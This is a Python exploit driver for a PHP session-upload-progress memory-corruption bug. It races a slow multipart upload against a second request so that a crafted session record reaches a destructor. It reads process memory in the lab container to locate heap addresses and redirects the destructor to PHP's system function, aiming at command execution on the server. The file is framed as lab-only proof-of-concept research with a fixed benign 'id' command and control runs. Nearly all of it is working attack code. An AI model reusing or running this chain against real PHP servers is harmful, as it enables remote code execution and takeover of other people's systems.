#!/usr/bin/env python3
"""LAB-ONLY CVE-2026-115560 cleanup=On race (action A).

The upload-progress hook writes the session file under the configured
php_serialize handler *before* the application runs, but with the default
session.upload_progress.cleanup=On those bytes are erased at
MULTIPART_EVENT_END. This driver keeps the record alive with a slow streaming
multipart upload and consumes it from a concurrent request (same PHPSESSID)
that switches to the "php" decoder in index.php. Both requests must run in
different prefork children (apache-race.conf); all children inherit the
parent's ZendMM main chunk, so the measured carrier delta holds for the fire
request.

The old /prime.php dummy record is erased by cleanup=On, so the second record
8.4.27's real var_destroy dtor needs is written by /seed.php (a persistent
session variable whose value starts with "|" + a valid a:1018 array).

Modes:
  measure -- stream a magic-marked payload, GET /index.php?m=5 (holds at the
             real var_destroy dtor), scan /proc/<pid>/mem for the carrier.
  fire    -- stream the fire payload, GET /index.php?m=4, check /tmp/vd.
  run     -- measure then fire (fresh SID/seed per attempt).

Lab-only; fixed benign command "id>/tmp/vd 2>&1"; no arbitrary commands.
"""
import argparse
import importlib.util
import os
import secrets
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


# Reuse the proven payload builder and /proc helpers without editing them.
VD = _load("vdrace", os.path.join(_HERE, "verify_115560_vardestroy.py"))
PC = VD.PC
MAGIC = VD.MAGIC
MOFF = VD.MOFF
DOFF = VD.DOFF
OFF_ZVAL = VD.OFF_ZVAL
sh = VD.sh
readelf_zif = VD.readelf_zif
PREFIX = PC.PREFIX

BND = b"----115560race"
CHUNK = b"B" * 65536


def _multipart_head(value):
    return (b"--" + BND + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"|" + value + b"\r\n"
            b"--" + BND + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="x.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\n")


def http_stream(host, port, path, value, sid, nchunks, delay, timeout=90,
                chunk_size=65536):
    """Streaming multipart POST: field first, then a slow file body.

    The progress record exists between the first file-data progress flush and
    MULTIPART_EVENT_END, i.e. for roughly nchunks * delay seconds.
    """
    body_head = _multipart_head(value)
    tail = b"\r\n--" + BND + b"--\r\n"
    chunk = CHUNK[:chunk_size]
    declared = len(body_head) + len(chunk) * nchunks + len(tail)
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
           f"Content-Length: {declared}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req + body_head)
    for _ in range(nchunks):
        try:
            s.sendall(chunk)
        except OSError:
            break
        time.sleep(delay)
    try:
        s.sendall(tail)
    except OSError:
        pass
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def http_get(host, port, path, sid, timeout=45):
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"GET {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def seed(host, port, sid, big=True, clear=False, timeout=20):
    q = "?clear=1" if clear else ("?d=1" if big else "")
    try:
        return http_get(host, port, "/seed.php" + q, sid, timeout)
    except OSError:
        return b""


def _prime_record_payload():
    """The same valid a:1018 array prime.php writes (first record)."""
    return PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00")


def consume(host, port, path, sid, timeout=45):
    return http_get(host, port, path, sid, timeout)


def race_once(host, port, container, sid, payload, consumer_path, settle,
              nchunks, delay, wait_dtor=True, timeout=60, do_seed=True):
    """Start the stream, run the consumer inside the window.

    Returns (consumer_response, upload_response, dtor_log, pid).
    """
    sh(container, "rm -f /tmp/meas_pid /tmp/dtor_log")
    if do_seed:
        seed(host, port, sid, big=True)
    up = {}
    th = threading.Thread(
        target=lambda: up.setdefault("r", http_stream(
            host, port, "/prime.php", payload, sid, nchunks, delay)),
        daemon=True)
    th.start()
    time.sleep(settle)

    cons = {}
    ct = threading.Thread(
        target=lambda: cons.setdefault("r", consume(host, port, consumer_path, sid)),
        daemon=True)
    ct.start()

    pid = 0
    if wait_dtor:
        for _ in range(100):
            pid = int(sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
            if pid:
                break
            time.sleep(0.1)
        log = sh(container, "cat /tmp/dtor_log 2>/dev/null").stdout
        # Do NOT join: the consumer is sleeping in the measured dtor. The
        # caller scans /proc/<pid>/mem and then kills the pid.
        return cons.get("r", b""), up.get("r", b""), log, pid
    # Let the consumer finish (m=5 sleeps 20 s; we kill the pid afterwards).
    ct.join(timeout=timeout)
    th.join(timeout=timeout)
    log = sh(container, "cat /tmp/dtor_log 2>/dev/null").stdout
    return cons.get("r", b""), up.get("r", b""), log, pid


def measure_race(host, port, container, sid, settle, nchunks, delay,
                 consumer_mode="5", spray=3048, ref=1020, do_seed=True):
    # Magic-marked, zero-filled payload: the same shape as the fire payload.
    val = bytearray(PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00"))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = VD.force_fail(bytes(val))
    path = f"/index.php?m={consumer_mode}&r={ref}&s={spray}"
    resp, upresp, log, pid = race_once(
        host, port, container, sid, payload, path, settle, nchunks, delay,
        do_seed=do_seed)
    if not pid:
        print(f"[!] measure consumer did not reach the dtor; dtor_log={log.strip()!r}")
        print(f"    consumer={resp.split(chr(13).encode())[0][:80]!r}")
        return None

    maps_text = sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib or not mains:
        print(f"[!] maps parse failed (lib={lib} mains={mains})")
        return None
    main = mains[0]
    zif = readelf_zif(container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        return None

    scan = sh(container, f"php /var/www/html/scan_prefix.php {pid} "
                         f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        hits.append((h, v, pref))
    if not hits:
        print(f"[!] magic scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    want = PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] dtor_log={log.strip()!r}")
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)}")
    if raw:
        magic_addr, value_string, _ = raw[0]
    else:
        magic_addr, value_string, _ = hits[0]
        print("[!] no hit carried the raw-input PREFIX; using first hit")
    carrier = value_string + DOFF
    delta = value_string - main
    print(f"[m] pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] magic={magic_addr:#x} carrier={carrier:#x} "
          f"value_string={value_string:#x} delta={delta:#x}")
    sh(container, f"kill -9 {pid} 2>/dev/null")
    time.sleep(0.5)
    return main, delta, lib, zif, carrier


def fire_race(host, port, container, sid, main, delta, zif, spray=3048,
              ref=1020, proof="/tmp/vd", settle=1.0, nchunks=8, delay=0.6,
              consumer_mode="4", do_seed=True):
    carrier = main + delta + DOFF
    key = (carrier + OFF_ZVAL).to_bytes(8, "little")
    payload = VD.force_fail(PC.build_value(carrier, zif, key, blob_fill=b"\x00"))
    sh(container, f"rm -f {proof} /tmp/meas_pid /tmp/dtor_log")
    path = f"/index.php?m={consumer_mode}&r={ref}&s={spray}"
    resp, upresp, log, pid = race_once(
        host, port, container, sid, payload, path, settle, nchunks, delay,
        wait_dtor=False, do_seed=do_seed)
    time.sleep(0.8)
    out = sh(container, f"cat {proof} 2>/dev/null").stdout
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[f] consumer={status} proof={out.strip()!r}")
    if log.strip():
        print(f"[f] dtor_log={log.strip()!r}")
    return "uid=" in out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18204")
    ap.add_argument("--container", default="php2shell-115560-8427-race")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--sid", default=None,
                    help="fixed session id (debug only; default fresh per attempt)")
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--settle", type=float, default=1.0,
                    help="seconds between the streaming upload start and the "
                         "concurrent consumer GET")
    ap.add_argument("--nchunks", type=int, default=8)
    ap.add_argument("--delay", type=float, default=0.6,
                    help="seconds between 64 KiB file chunks (upload window)")
    ap.add_argument("--spray", type=int, default=None)
    ap.add_argument("--ref", type=int, default=1020)
    ap.add_argument("--attempts", type=int, default=4,
                    help="fire attempts with a fresh SID/seed each")
    ap.add_argument("--no-seed", dest="do_seed", action="store_false",
                    help="skip the persistent first record (negative control)")
    ap.add_argument("--no-remeasure", dest="remeasure", action="store_false",
                    help="do not re-measure after a missed fire attempt")
    ap.add_argument("--measure-attempts", type=int, default=4)
    ap.add_argument("--main", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--consumer-mode", default="4", choices=["1", "4"])
    ap.add_argument("mode", nargs="?", default="run",
                    choices=["measure", "fire", "run", "probe"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    spray = args.spray if args.spray is not None else (
        8135 if args.build.startswith("8.5") else 3048)
    print(f"[*] 115560 cleanup=On race ({args.build})")
    print(f"    target {args.target} container {args.container}")
    print(f"    settle={args.settle}s chunks={args.nchunks}x64KiB "
          f"delay={args.delay}s window~{args.nchunks * args.delay:.1f}s spray={spray}")

    if args.mode == "probe":
        # Cheap liveness probe: m=1 logs every dtor; m=5 holds at the real one.
        sid = args.sid or secrets.token_hex(16)
        val = bytearray(PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00"))
        val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
        payload = VD.force_fail(bytes(val))
        resp, upresp, log, pid = race_once(
            host, port, args.container, sid, payload,
            f"/index.php?m={args.consumer_mode}&r={args.ref}&s={spray}",
            args.settle, args.nchunks, args.delay, wait_dtor=False, timeout=10)
        print(f"[p] consumer={resp[:100]!r}")
        print(f"[p] dtor_log={log.strip()!r} meas_pid={pid}")
        return 0 if log.strip() else 1

    main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
    if args.mode in ("measure", "run") and (main_addr is None or delta is None):
        res = None
        for i in range(args.measure_attempts):
            sid = args.sid or secrets.token_hex(16)
            print(f"[m] measure attempt {i + 1}/{args.measure_attempts} sid={sid}")
            res = measure_race(host, port, args.container, sid,
                               args.settle, args.nchunks, args.delay,
                               "5", spray, args.ref, do_seed=args.do_seed)
            if res:
                break
            time.sleep(0.5)
        if not res:
            print("[!] race did not produce the real var_destroy dtor")
            return 2
        main_addr, delta, lib, zif, _carrier = res
    if args.mode == "measure":
        return 0

    if main_addr is None or delta is None:
        print("[!] fire needs --main and --delta (or 'run' to measure)")
        return 2
    if not zif:
        if not lib:
            print("[!] fire needs --zif or --lib")
            return 2
        zif = readelf_zif(args.container, lib)
    if args.bias_zif:
        zif += args.bias_zif
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")

    for i in range(args.attempts):
        sid = args.sid or secrets.token_hex(16)
        print(f"[f] fire attempt {i + 1}/{args.attempts} sid={sid}")
        if fire_race(host, port, args.container, sid, main_addr, delta, zif,
                     spray, args.ref, args.proof, args.settle, args.nchunks,
                     args.delay, args.consumer_mode, args.do_seed):
            print("[EVIDENCE] cleanup=On race -> 115560 var_destroy -> uid=33")
            return 0
        if i + 1 < args.attempts and args.remeasure:
            # The first race measure after a cold worker pool can land on a
            # different ZendMM bin (observed 0x20000 drift on 8.4/8.5). A wrong
            # delta only crashes a child; re-measure and retry.
            print("[i] fire missed; re-measuring the carrier delta")
            res = measure_race(host, port, args.container,
                               args.sid or secrets.token_hex(16),
                               args.settle, args.nchunks, args.delay,
                               "5", spray, args.ref, do_seed=args.do_seed)
            if res:
                main_addr, delta, _lib, zif, _carrier = res
        time.sleep(0.4)
    print("[!] no proof written")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
